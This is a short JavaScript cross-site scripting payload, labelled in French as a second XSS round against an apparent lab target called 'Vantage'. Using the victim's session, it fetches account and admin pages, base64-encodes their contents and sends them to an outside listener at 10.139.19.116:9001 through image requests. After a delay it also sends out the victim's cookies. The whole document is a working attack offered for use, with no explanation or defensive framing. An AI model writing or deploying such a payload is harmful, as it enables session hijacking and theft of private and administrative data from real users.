// Vantage — XSS round 2 : récupère account.php (formulaire edit) + pages admin
(function () {
  var L = 'http://10.139.19.116:9001/';
  var pages = ['/account.php', '/account.php?edit=1', '/admin/', '/admin/search.php', '/admin/review.php?id=2'];
  var n = 0;
  function send(name, data) {
    try {
      new Image().src = L + 'p_' + name + '?d=' + encodeURIComponent(btoa(unescape(encodeURIComponent(data))));
    } catch (e) {}
  }
  function grab(url) {
    var name = 'a' + (n++);
    fetch(url, { credentials: 'include' })
      .then(function (r) { return r.text(); })
      .then(function (t) { send(name, url + '\n\n' + t); })
      .catch(function (e) { send(name, url + ' ERR ' + e); });
  }
  pages.forEach(grab);
  setTimeout(function () {
    try {
      send('cookie', document.cookie);
    } catch (e) {}
  }, 4000);
})();
